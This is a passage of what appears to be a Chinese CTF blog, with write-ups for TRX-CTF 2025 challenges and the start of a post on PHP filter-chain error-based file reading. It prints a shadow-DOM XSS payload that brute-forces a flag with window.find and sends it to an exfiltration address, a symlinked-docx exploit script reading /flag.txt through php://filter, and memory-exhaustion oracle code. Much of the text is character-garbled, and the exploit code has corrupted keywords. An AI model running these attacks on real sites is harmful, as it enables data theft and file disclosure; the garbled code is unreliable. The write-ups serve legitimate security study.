app.listen(PORT, () =\u0026gt; { console.log(`Server running on port ${PORT}`) }) bot.js #\r~~æˆ‘æœäº†æ‰çœ‹è§æœ€é¡¶ä¸Šçš„æ³¨é‡Š\u0026hellip;~~~\n// From ASIS CTF Finals 2024 - leakbin const puppeteer = require(\u0026#34;puppeteer\u0026#34;); const PORT = process.env.PORT || 1337; const SITE = `http://localhost:${PORT}`; const FLAG = process.env.FLAG || \u0026#34;TRX{fake_flag_for_testing}\u0026#34;; const FLAG_REGEX = /^TRX{[a-z0-9_]+}$/; const sleep = async (ms) =\u0026gt; new Promise((resolve) =\u0026gt; setTimeout(resolve, ms)); const visit = (payload) =\u0026gt; { return new Promise(async (resolve, reject) =\u0026gt; { if (!FLAG_REGEX.test(FLAG)) { return reject(new Error(\u0026#34;Error: Flag does not match flag regex, contact an admin if this is on remote\u0026#34;)); } let browser, context, page; try { browser = await puppeteer.launch({ headless: true, args: [ \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;, \u0026#39;--js-flags=--noexpose_wasm,--jitless\u0026#39; // this is a web chall :) ], dumpio: true, pipe: true, executablePath: process.env.PUPPETEER_EXECUTABLE_PATH }); // incognito btw context = await browser.createBrowserContext(); page = await context.newPage(); await page.goto(SITE, { waitUntil: \u0026#34;domcontentloaded\u0026#34;, timeout: 5000 }); await page.evaluate((flag) =\u0026gt; { localStorage.setItem(\u0026#34;secret\u0026#34;, flag); }, FLAG); await page.close(); } catch (err) { console.error(err); if (browser) await browser.close(); return reject(new Error(\u0026#34;Error: Setup failed, if this happens consistently on remote contact an admin\u0026#34;)); } resolve(\u0026#34;Success!\u0026#34;); try { page = await context.newPage(); await page.goto(`${SITE}?payload=${encodeURIComponent(payload)}`, { waitUntil: \u0026#34;domcontentloaded\u0026#34;, timeout: 5000 }); await sleep(1000); } catch (err) { console.error(err); } if (browser) await browser.close(); }); }; module.exports = { visit }; å…ˆçœ‹ä¸€ä¸‹botè¿™è¾¹ï¼Œå¯ä»¥çœ‹åˆ°ï¼š\nawait page.evaluate((flag) =\u0026gt; { localStorage.setItem(\u0026#34;secret\u0026#34;, flag); }, FLAG); åœ¨localçš„åœ°æ–¹å­˜å‚¨äº†flag\ntry { page = await context.newPage(); await page.goto(`${SITE}?payload=${encodeURIComponent(payload)}`, { waitUntil: \u0026#34;domcontentloaded\u0026#34;, timeout: 5000 }); await sleep(1000); } catch (err) { console.error(err); } åœ¨è¿™é‡Œè·³è½¬åˆ°å…¶localç„¶åå°†å‚æ•°ä¼ é€’è¿‡å»ã€‚ ä¼ é€’åˆ°index.ejsä¸­\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Hello\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe srcdoc=\u0026#39;\u0026lt;%= include(\u0026#34;iframe\u0026#34;, { payload: payload }) %\u0026gt;\u0026#39; sandbox=\u0026#34;allow-scripts allow-same-origin\u0026#34; \u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç„¶åè¿™é‡Œç”¨äº†\u0026lt;%=%\u0026gt;æ¥æ¸²æŸ“ï¼Œå…¶å®å°±æ˜¯æŠŠiframeåµŒå¥—è¿›æ¥ ç„¶ååœ¨iframeä¸­åµŒå¥—çš„åœ°æ–¹ï¼š\n\u0026lt;script\u0026gt; (function() { let container = document.getElementById(\u0026#34;secret-container\u0026#34;); let secretDiv = document.createElement(\u0026#34;div\u0026#34;); let shadow = secretDiv.attachShadow({ mode: \u0026#34;closed\u0026#34; }); let flagElement = document.createElement(\u0026#34;span\u0026#34;); flagElement.textContent = localStorage.getItem(\u0026#34;secret\u0026#34;) || \u0026#34;TRX{fake_flag_for_testing}\u0026#34;; shadow.appendChild(flagElement); localStorage.removeItem(\u0026#34;secret\u0026#34;); container.appendChild(secretDiv); })(); let d = document.createElement(\u0026#34;div\u0026#34;); d.innerHTML = \u0026#34;\u0026lt;%= payload %\u0026gt;\u0026#34;; document.body.appendChild(d); \u0026lt;/script\u0026gt; ç„¶åè¿™é‡Œæˆ‘è§‰å¾—æœ‰å¿…è¦è¯´ä¸€ä¸‹å…³äºShadow DOMæ–¹é¢çš„ä¸€äº›çŸ¥è¯†ç‚¹ã€‚ å› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å®ä»å§‹è‡³ç»ˆflagéƒ½æ²¡æœ‰è¢«æ¸²æŸ“åˆ°å¯è§†çš„é¡µé¢å†…ï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬æœ€ç»ˆèƒ½è·å–åˆ°flag?å°±æ˜¯è¦Hacking Shadow DOMã€‚\nShadow DOM æ˜¯ Web Components æŠ€æœ¯çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸ä½ åˆ›å»º å°è£…çš„ DOMï¼Œä»è€Œä½¿ä½ èƒ½å¤Ÿå°† HTML ç»“æ„ã€CSS æ ·å¼å’Œ JavaScript åŠŸèƒ½å°è£…åœ¨ä¸€ä¸ªç‹¬ç«‹çš„ã€éš”ç¦»çš„ç¯å¢ƒä¸­ã€‚è¿™ä½¿å¾—ç»„ä»¶çš„æ ·å¼å’ŒåŠŸèƒ½ä¸å—å¤–éƒ¨é¡µé¢çš„å½±å“ï¼Œä¹Ÿä¸å½±å“å¤–éƒ¨é¡µé¢ã€‚ï¼ˆGPTå›ç­”ï¼‰\nè€Œåœ¨iframe.ejsä¸­æœ‰è¿™ä¹ˆä¸€è¡Œshadow.appendChild(flagElement);ï¼Œä¹Ÿå°±æ˜¯ä»–æŠŠè¿™ä¸ªflagå°è£…èµ·æ¥ï¼Œä¹Ÿå°±æ˜¯é¡µé¢ä¸Šæ˜¯ä¸ä¼šæ˜¾ç¤ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¼ payloadçš„æ—¶å€™å°±æ²¡åŠæ³•åˆ©ç”¨æ­£åˆ™æ¥å¯¹é¡µé¢å†…çš„flagè¿›è¡Œè·å–ã€‚\nå…·ä½“æ€ä¹ˆæ”»å‡»å¯ä»¥çœ‹è¿™ä¸€ç¯‡ã€‚ https://blog.ankursundara.com/shadow-dom/ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨window.findæ¥æŒ‡å‘ä»–è¿›è¡Œè·å–flagçš„æ“ä½œã€‚\næ¥ç€æˆ‘ä»¬æ¥çœ‹CSPå’ŒSandBoxçš„ä½ç½®\n.app.use((req, res, next) =\u0026gt; { .res.setHeader(\u0026#34;Content-Security-Policy\u0026#34;\u0026#34;Content-Security-Policy\u0026#34;, \u0026#34;default-src \u0026#39;none\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;; form-action \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;;\u0026#34;);); next ( ) }) å¯ä»¥çœ‹åˆ°è®¾ç½®äº†ç­–ç•¥script-srcæ˜¯unsafe-inlineæ‰€ä»¥å¯ä»¥å†…è”æ‰§è¡Œjs å…¶ä»–çš„ï¼Œè¿™é‡Œçš„default-srcè®¾ç½®æˆäº†none,é˜»æ­¢é¡µé¢åŠ è½½ä»»ä½•å¤–éƒ¨èµ„æºã€‚æ‰€ä»¥å¯¹äºå¤–å¸¦flagè¿™é‡Œè¿˜éœ€è¦ç»•è¿‡ä¸€ä¸‹ã€‚\n\u0026lt; iframe srcdoc = \u0026#39;\u0026lt;%= include(\u0026#34;iframe\u0026#34;, { payload: payload }) %\u0026gt;\u0026#39; sandbox = \u0026#34;allow-scripts allow-same-origin\u0026#34; \u0026gt;\u0026lt;/ iframe \u0026gt; è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªsandboxï¼Œä½†æ˜¯è¿˜æ˜¯é™åˆ¶äº†å¼¹å‡ºæ–°çª—å£ã€‚ å…·ä½“ç»•è¿‡çœ‹è¿™ä¸€ç¯‡ï¼š https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨top.document.bodyè¿›è¡Œå†™å…¥ï¼Œç„¶ååœ¨å¯¼èˆªé¡µå†™å…¥xssï¼Œè¿›è¡Œå¤–å¸¦flag\næœ€ç»ˆexp:\nImport httpx BASE = \u0026#34;http://localhost:1337\u0026#34; DEST = \u0026#34;\u0026#34;ï¼Ÿ#å¤–å¸¦åœ°å€ Payroll = \u0026#39;\u0026#39;\u0026#39; \u0026lt;img src onerror=\u0026#34; window.flag = \u0026#39;TRX{\u0026#39;; for (let j = 0; j \u0026lt;= 60; j++) { for (let i = 32; i \u0026lt;= 126; i++) { let c = String. from CharCode(i); if(window.find(window.flag + c,true,false,true)) { window.flag += c; console.log(window.flag); to break; } } } top.document.body.innerHTML += \u0026#39;\u0026lt;img src onerror=`\u0026lt;\u0026lt;\u0026lt;DEST\u0026gt;\u0026gt;/flag?\u0026#39; +window.flag+\u0026#39;`\u0026gt;\u0026#39;; \u0026#34;\u0026gt; \u0026#39;\u0026#39;\u0026#39; payload = payload.replace(\u0026#34;\u0026lt;\u0026lt;DEST\u0026gt;\u0026gt;, DEST) payload = \u0026#39;\u0026#39;.join(f\u0026#39; \\\\ x{ord(c):02x}\u0026#39; for c in payload) print(BASE + \u0026#34;/? payload=\u0026#34; + payload) response = httpx.post(BASE + \u0026#34;/visit\u0026#34;, json={\u0026#34;payload\u0026#34; : payload}) print (response.text) æ³¨æ„ä¸€ä¸‹ä¸ºäº†å®Œæ•´çš„å°†payloadä¼ è¾“ï¼Œæˆ‘ä»¬éœ€è¦hexä¸€ä¸‹ã€‚ æœ€åå¤–å¸¦\nzStego #\rç®€ä»‹\nModern day script kiddies like to encrypt their conversations using this weird \u0026quot;zlib\u0026quot; thing. I had literally never heard of it. Doesn't look safe, you say? Well, no one expects it so it works! I created this majestic tool to look for zlib-encrypted messages in Word documents, because I'm fascinated by this zlib-encryption everyone uses. (TRX script kiddies left a flag in /flag.txt) è¿›æ¥åé¡µé¢æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å’Œæ‰«æåŠŸèƒ½ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æºç ï¼ˆä¸»è¦ç‰‡æ®µï¼‰\n/* processing uploaded Word - valid document contains relationship table */ $zip = new ZipArchive(); $zipFilename = $_FILES[\u0026#39;input\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($zip-\u0026gt;open($zipFilename) !== true || $zip-\u0026gt;locateName(REL_FILENAME) === false) hellYeah(400, \u0026#39;File is not a valid Word document.\u0026#39;); //è§£ææˆSimpleXMLå¯¹è±¡ $relsDom = simplexml_load_string($zip-\u0026gt;getFromName(REL_FILENAME)); if ($relsDom === false) hellYeah(400, \u0026#39;Invalid object relationship table. Document may be corrupted.\u0026#39;); /* extract document\u0026#39;s \u0026#34;media\u0026#34; folder into a temporary directory */ $tmpDir = exec(\u0026#34;mktemp -d --tmpdir=/tmp/ zipXXXXXXXXX\u0026#34;); //åˆ›å»ºä¸´æ—¶ç›®å½•ï¼Œç›®å½•åéšæœº shell_exec(\u0026#34;unzip $zipFilename \\\u0026#34;word/media*\\\u0026#34; -d \\\u0026#34;$tmpDir\\\u0026#34;\u0026#34;); function cleanup($tmpDir) { shell_exec(\u0026#34;rm -rf $tmpDir\u0026#34;); } register_shutdown_function(\u0026#39;cleanup\u0026#39;, $tmpDir); // cleanup in the end chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; } } æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å…¶å®å°±æ˜¯ä¼ªé€ ä¸€ä¸ªdocxæ–‡ä»¶ï¼Œè®©ä»–åœ¨file_get_contentçš„æ—¶å€™æŠŠä¸€ä¸ªå‹ç¼©åçš„flag.txtæ‹¿å‡ºæ¥å†æ”¾è¿›decodeä¸€ä¸‹å³å¯ã€‚ ä½†æ˜¯è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹æ€ä¹ˆå»æ„é€ è¿™ä¸ªæ–‡ä»¶ï¼Œç”¨è½¯é“¾æ¥ä½¿å…¶mediaæŒ‡å‘æ ¹ç›®å½•å»è¯»å–flagï¼Œè¿™é‡Œç›´æ¥è´´expå§\nimport os import zipfile import requests def ZipDir(inputDir, outputZip): \u0026#39;\u0026#39;\u0026#39;Zip up a directory and preserve symlinks and empty directories\u0026#39;\u0026#39;\u0026#39; zipOut = zipfile.ZipFile(outputZip, \u0026#39;w\u0026#39;, compression=zipfile.ZIP_DEFLATED) rootLen = len(os.path.dirname(inputDir)) def _ArchiveDirectory(parentDirectory): contents = os.listdir(parentDirectory) # store empty directories if not contents: # http://www.velocityreviews.com/forums/t318840-add-empty-directory-using-zipfile.html archiveRoot = parentDirectory[rootLen:].replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;).lstrip(\u0026#39;/\u0026#39;) zipInfo = zipfile.ZipInfo(archiveRoot+\u0026#39;/\u0026#39;) zipOut.writestr(zipInfo, \u0026#39;\u0026#39;) for item in contents: fullPath = os.path.join(parentDirectory, item) if os.path.isdir(fullPath) and not os.path.islink(fullPath): _ArchiveDirectory(fullPath) else: archiveRoot = fullPath[rootLen:].replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;).lstrip(\u0026#39;/\u0026#39;) if os.path.islink(fullPath): # http://www.mail-archive.com/python-list@python.org/msg34223.html zipInfo = zipfile.ZipInfo(archiveRoot) zipInfo.create_system = 3 # long type of hex val of \u0026#39;0xA1ED0000L\u0026#39;, # say, symlink attr magic... zipInfo.external_attr = 2716663808 zipOut.writestr(zipInfo, os.readlink(fullPath)) else: zipOut.write(fullPath, archiveRoot, zipfile.ZIP_DEFLATED) _ArchiveDirectory(inputDir) zipOut.close() def pack_payload(zip_filename): tmp_dir = \u0026#34;./tmp/\u0026#34; word_dir = os.path.join(tmp_dir, \u0026#34;word\u0026#34;) rels_dir = os.path.join(word_dir, \u0026#34;_rels\u0026#34;) media_symlink = os.path.join(word_dir, \u0026#34;media\u0026#34;) os.makedirs(rels_dir, exist_ok=True) # Create the document.xml.rels file with user-defined content rels_content = \u0026#34;\u0026#34;\u0026#34; \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/php://filter/read=zlib.deflate/resource=flag.txt\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; \u0026#34;\u0026#34;\u0026#34;.strip() with open(os.path.join(rels_dir, \u0026#34;document.xml.rels\u0026#34;), \u0026#34;w\u0026#34;) as f: f.write(rels_content) if not os.path.exists(media_symlink): os.symlink(\u0026#34;/\u0026#34;, media_symlink) zip_path = os.path.join(tmp_dir, zip_filename) ZipDir(tmp_dir, zip_path) return zip_path def upload_zip(zip_path, url): with open(zip_path, \u0026#39;rb\u0026#39;) as f: files = {\u0026#39;input\u0026#39;: (os.path.basename(zip_path), f, \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;)} response = requests.post(url, files=files) print(\u0026#34;Status:\u0026#34;, response.status_code) print(\u0026#34;Body:\u0026#34;, response.text) if __name__ == \u0026#34;__main__\u0026#34;: zip_filename = \u0026#34;output.docx\u0026#34; upload_url = \u0026#34;http://localhost:1337/upload.php\u0026#34; zip_path = pack_payload(zip_filename) upload_zip(zip_path, upload_url) æœ€åæ‹¿åˆ°flag ","date":"10 March 2025","externalUrl":null,"permalink":"/posts/trx-ctf-writeups/","section":"Posts","summary":"","title":"TRX-CTF2025 å¤ç°","type":"posts"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/tags/upzip/","section":"Tags","summary":"","title":"Upzip","type":"tags"},{"content":"","date":"25 July 2024","externalUrl":null,"permalink":"/tags/filterchain/","section":"Tags","summary":"","title":"Filterchain","type":"tags"},{"content":"é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼š https://forum.butian.net/share/3645\nå‰è¨€ #\rå¸ˆå‚…ä»¬åœ¨ç¾¤é‡Œè®¨è®ºå‡ºé¢˜çš„æ—¶å€™ï¼Œå‘äº†ä¸€æ®µæ²¡æœ‰è¿”å›çš„file_get_contentå‡ºæ¥ï¼Œç»“æœGokuå¸ˆå‚…è¯´å¯ä»¥åˆ©ç”¨ä¾§ä¿¡é“æ¥æ‰“ï¼Œæˆ‘å¯»æ€ç€å’‹æ‰“å‘¢ï¼Œäºæ˜¯å»æ±‚å­¦äº†ï¼Œç»“æœæˆ‘å€’æ˜¯è§‰å¾—ä¸å«ä¾§ä¿¡é“å§ï¼Œæˆ‘è§‰å¾—åªæ˜¯é€šè¿‡filterçš„å„ç§parselæ¥æŠŠflagæˆ–è€…ä¿¡æ¯leakå‡ºæ¥ã€‚\ndemo1 #\rè¿™é‡Œæ˜¯è¯´åœ¨DownUnder2022ä¸­æœ‰è¿™æ ·çš„ä¸€é“é¢˜\n\u0026lt;?php file($_POST[0]); ä»–æ²¡æœ‰å§è¯»å–åˆ°çš„å†…å®¹printå‡ºæ¥ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜ä¼¼ä¹æ˜¯0è§£ã€‚ å…·ä½“æ€ä¹ˆè§£çš„è¯·å¬ä¸‹é¢çš„è®²è§£\nFile read with error-based oracle #\rè¿™é‡ŒåŸºäºçš„åŸç†å°±æ˜¯è¯´åœ¨filterä¸­èµ°è¿‡æ»¤å™¨çš„è¯ä¼šæœ‰æœ€å¤§çš„sizeé™åˆ¶ï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæŠ¥é”™ä½œä¸ºæ ‡å¿—æ¥æŠŠæ•°æ®çˆ†ç ´å‡ºæ¥ ç„¶åç®€è¦æ¦‚æ‹¬å°±æ˜¯ä¸‰ä¸ªæ­¥éª¤ï¼š\nç”¨iconvæ¥ä¸æ–­encodingæ¥å¢åŠ é•¿åº¦ä»è€Œè§¦å‘memory error ç”¨dechunkæ¥ç¡®å®šç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚ å†åˆ©ç”¨iconvå»ä¸æ–­çˆ†ç ´å‰©ä¸‹çš„å­—ç¬¦ã€‚ å…¶å®å°±æ˜¯ä¸æ–­å¾ªç¯çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹å…¶å®å¾ˆå¤šéƒ½æ˜¯å’Œæˆ‘å‰é¢å†™çš„filterchainæœ‰å…³ç³»çš„ã€‚ OVERFLOWING THE MAXIMUM FILE SIZE #\råœ¨åˆ©ç”¨php://filterçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ç»™ä»–åŠ å…¥è¿‡æ»¤å™¨æ¥è·å–ç¼–ç åçš„å†…å®¹ç­‰ç­‰æ“ä½œ,è¿™é‡Œæ˜¯åˆ©ç”¨ä¸€äº›filterçš„æ•ˆæœ\n$ php -r \u0026#39;$string = \u0026#34;START\u0026#34;; echo strlen($string).\u0026#34;\\n\u0026#34;; 5 $ php -r \u0026#39;$string = \u0026#34;START\u0026#34;; echo strlen(iconv(\u0026#34;UTF8\u0026#34;, \u0026#34;UNICODE\u0026#34;, $string)).\u0026#34;\\n\u0026#34;;\u0026#39; 12 $ php -r \u0026#39;$string = \u0026#34;START\u0026#34;; echo strlen(iconv(\u0026#34;UTF8\u0026#34;, \u0026#34;UCS-4\u0026#34;, $string)).\u0026#34;\\n\u0026#34;;\u0026#39; 20 è¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹ä¸€ä¸‹USC-4è¿™ä¸ªï¼Œå¯ä»¥çœ‹åˆ°ä»–æŠŠ5ä¸ªå­—èŠ‚çš„å†…å®¹ç»™ä»–è½¬æ¢æˆäº†20ä¸ªé•¿åº¦çš„å­—èŠ‚ã€‚å¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªUSC-4LEçš„è¿‡æ»¤å™¨ï¼Œä»–å®ç°çš„æ•ˆæœæ˜¯è¿™æ ·çš„ã€‚ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰§è¡Œäº†ä¸¤æ¬¡iconvåæ‰€æœ‰çš„å­—ç¬¦éƒ½è¢«æåˆ°æœ€å‰é¢äº†å½“åšå•ç‹¬çš„ä¸€è¡Œã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸æ–­çš„åˆ©ç”¨USC-4LEæ¥æ‰©å¤§å®¹é‡æ¥ä½¿å¾—å…¶æº¢å‡º\n\u0026lt;?php $string = \u0026#34;delete\u0026#34;; for($i = 1; $i \u0026lt; 20 ;$i++){ $string = iconv(\u0026#34;UTF8\u0026#34;,\u0026#34;UCS-4LE\u0026#34;,$string); } ?\u0026gt; å¯ä»¥çœ‹åˆ°zshè‡ªåŠ¨æŠŠè¿™ä¸ªè¿›ç¨‹åˆ æ‰äº†ã€‚ï¼ˆè¿™é‡Œå…¶å®å°±æ˜¯æº¢å‡ºäº†ä»–è‡ªåŠ¨æŠŠè¿›ç¨‹killäº†ï¼‰ æŠ¥é”™ä¹Ÿå¯ä»¥æ˜¯è¿™æ ·çš„\nFatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 83886144 bytes) in /tmp/iconv.php on line 6 è¿™å°±æ»¡è¶³äº†ç¬¬ä¸€ä¸ªæ¡ä»¶äº†ï¼Œå°±æ˜¯æˆ‘ä»¬è¦é€ æˆä¸€æ¬¡æº¢å‡ºï¼ˆå…¶å®æˆ‘è®¤ä¸ºå°±æ˜¯ä½œä¸ºä¸€ä¸ªå›æ˜¾æ¥åˆ¤æ–­æ˜¯å¦ç¬¬ä¸€ä¸ªå­—ç¬¦æ»¡è¶³æŸä¸ªè¿‡æ»¤å™¨ï¼Œè¿™æ ·å­å°±èƒ½ä¸€ä¸ªä¸ªç¡®å®šå­—ç¬¦ç„¶åæŠŠå†…å®¹leakå‡ºæ¥ï¼‰\nLEAKING THE FIRST CHARACTER OF THE FILE #\rå­¦ä¼šè¿™ä¸ªä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ¥å¼€å§‹åˆ©ç”¨dechunkæ¥ç¡®å®šå­—ç¬¦ç­‰ç­‰äº‹æƒ…äº†ã€‚\nå…³äºdechunkçš„ç”¨æ³•ã€‚\n5\\r\\n (chunk length) Chunk\\r\\n (chunk data) f\\r\\n (chunk length) PHPfiltersrock!\\r\\n (chunk data) ç„¶åæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­\n$ echo \u0026#34;START\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; START $ echo \u0026#34;0TART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; $ echo \u0026#34;ATART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; $ echo \u0026#34;aTART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; $ echo \u0026#34;GTART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; GTART å¯ä»¥çœ‹åˆ°è¿™é‡Œåªè¦æ˜¯hexadecimal valueï¼š[0-9]ã€[a-f]ã€[A-F]å¼€å¤´çš„éƒ½è¢«dechunk dropæ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç¡®å®šå¼€å¤´çš„æ˜¯å¦æ˜¯16è¿›åˆ¶å­—ç¬¦ã€‚ ä¹Ÿå°±æ˜¯æ­é…ä¸Šé¢çš„overflowï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šæ˜¯å¦æ˜¯16è¿›åˆ¶å¼€å¤´çš„stringäº†ã€‚ä½†æ˜¯è¦æ‰¾åˆ°å…·ä½“å­—ç¬¦è¿˜è¦ç»§ç»­å¾€ä¸‹çœ‹â€˜\nRetrieving the leading character value #\rRetrieving [a-e] characters #\ré¦–å…ˆæˆ‘ä»¬å°±è¦æ¥ç¡®å®ša-eå­—ç¬¦çš„æƒ…å†µã€‚ è¿™é‡Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹CP930æˆ–è€…å«X-IBM930 ASCII codeï¼š\nx0 x1 x2 x3 x4 x5 x6 [\u0026hellip;] xf [\u0026hellip;.] 6x ` a b c d e f [\u0026hellip;] o [\u0026hellip;.] CP930ã€X-IBM930\nx0 x1 x2 x3 x4 x5 x6 [\u0026hellip;] xf [\u0026hellip;] 6x - / a b c d e [\u0026hellip;] ? [\u0026hellip;] cx { A B C D E F [\u0026hellip;] [\u0026hellip;] fx 0 1 2 3 4 5 6 [\u0026hellip;] Å¸ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨X-IBM930ä¸­å°å†™å­—æ¯ï¼Œå¤§å†™å­—æ¯å’Œæ•°å­—éƒ½æ˜¯åœ¨ä¸åŒç´¢å¼•ä¸Šçš„ï¼Œæ‰€ä»¥base64-encodeå°±ä¸ä¼šå¼„æ··ã€‚ æ¥çœ‹ä¸ªä¾‹å­\n\u0026lt;?php $guess_char = \u0026#34;\u0026#34;; for ($i=1; $i \u0026lt;= 7; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars\u0026#34;; $filter = \u0026#34;php://filter/$guess_char/resource=/tmp/test\u0026#34;; echo \u0026#34;IBM-930 conversions : \u0026#34;.$i; echo \u0026#34;, First char value : \u0026#34;.file_get_contents($filter)[0].\u0026#34;\\n\u0026#34;; } æ‰§è¡Œ\n$ echo \u0026#39;aSTART\u0026#39; \u0026gt; /tmp/test $ php oracle.php IBM-930 conversions : 1, First char value : b IBM-930 conversions : 2, First char value : c IBM-930 conversions : 3, First char value : d IBM-930 conversions : 4, First char value : e IBM-930 conversions : 5, First char value : f IBM-930 conversions : 6, First char value : g IBM-930 conversions : 7, First char value : h å…¶ä¸­$remove_junk_charsæ˜¯ç”¨äºä»é“¾ä¸­åˆ é™¤ä¸å¯æ‰“å°çš„å­—ç¬¦ï¼Œ$guess_char ç”¨äºåº”ç”¨ X-IBM-930 ç¼–è§£ç å™¨ã€‚æœ€åï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šæ‰“å°è½¬æ¢åçš„æ–‡ä»¶å†…å®¹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚\nç„¶åæˆ‘ä»¬æ¥è¯•è¯•å’Œå‰é¢æ„é€ errorä¸€æ ·\n\u0026lt;?php $size_bomb = \u0026#34;\u0026#34;; for ($i = 1; $i \u0026lt;= 13; $i++) { $size_bomb .= \u0026#34;convert.iconv.UTF8.UCS-4|\u0026#34;; } $guess_char = \u0026#34;\u0026#34;; $index = 0; for ($i=1; $i \u0026lt;= 6; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars\u0026#34;; $filter = \u0026#34;php://filter/$guess_char|dechunk|$size_bomb/resource=/tmp/test\u0026#34;; file_get_contents($filter); echo \u0026#34;IBM-930 conversions : \u0026#34;.$i.\u0026#34;, the first character is \u0026#34;.\u0026#34;edcba\u0026#34;[$i-1].\u0026#34;\\n\u0026#34;; } è¯»è€…å¯ä»¥è‡ªè¡Œå»è¿è¡Œã€‚ é€šè¿‡è¿™ä¸ªå¾—å‡ºç»“è®ºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸€æ®µæ¥ç¡®å®šå¼€å¤´å­—æ¯æ˜¯aã€bã€cã€dã€eè¿™å‡ ä¸ªå­—æ¯ï¼ˆä»–ä¼šåœ¨è¿™äº›å­—æ¯ä¹‹åæŠ¥errorï¼‰\nåŒæ 